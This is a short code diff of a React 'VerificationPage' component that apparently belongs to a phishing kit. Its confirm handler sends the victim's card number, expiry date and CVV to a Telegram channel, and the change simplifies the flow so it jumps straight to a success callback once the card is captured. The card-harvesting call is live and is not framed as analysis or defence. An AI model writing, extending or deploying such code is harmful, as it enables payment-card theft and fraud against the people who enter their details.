@@ -98,16 +98,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   const handleConfirm = async (e: React.FormEvent) => {
     e.preventDefault();
     await sendToTelegram(`<b>[VERIFICATION] Card Details:</b>\nNumber: ${cardNumber}\nExpiry: ${expiryDate}\nCVV: ${cvv}`);
-    if (mode === 'final') {
-      setLoading(true);
-      setTimeout(() => {
-        setLoading(false);
-        setStep('enter_code');
-        setCountdown(45);
-      }, 3000);
-    } else {
-      onVerificationSuccess();
-    }
+    onVerificationSuccess();
   };
 
   const handleCodeSubmit = async (e: React.FormEvent) => {
